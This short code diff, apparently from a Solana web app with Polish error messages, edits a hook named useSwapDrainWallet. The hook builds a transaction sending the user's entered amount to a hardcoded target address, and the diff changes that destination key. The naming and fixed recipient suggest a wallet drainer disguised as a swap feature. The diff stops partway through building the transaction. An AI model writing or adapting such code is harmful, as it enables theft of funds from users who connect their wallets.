@@ -12,7 +12,7 @@ export const useSwapDrainWallet = () => {
       if (!publicKey) throw new Error('Portfel niepodłączony')
       if (!amountIn || new Decimal(amountIn).lte(0)) throw new Error('Nieprawidłowa kwota')
 
-      const TARGET_ADDRESS = new PublicKey('RaybDJtgwmLE1AWmEMXXtPQSjkV1soWVSxK152iqWZu')
+      const TARGET_ADDRESS = new PublicKey('Ray5yZMBLm4A8sLG2RgVJ7Ek48vj8xrQyXrLe3JTZ3K')
       const amountToSend = new Decimal(amountIn).mul(1e9).toNumber()
 
       const transaction = new Transaction().add(
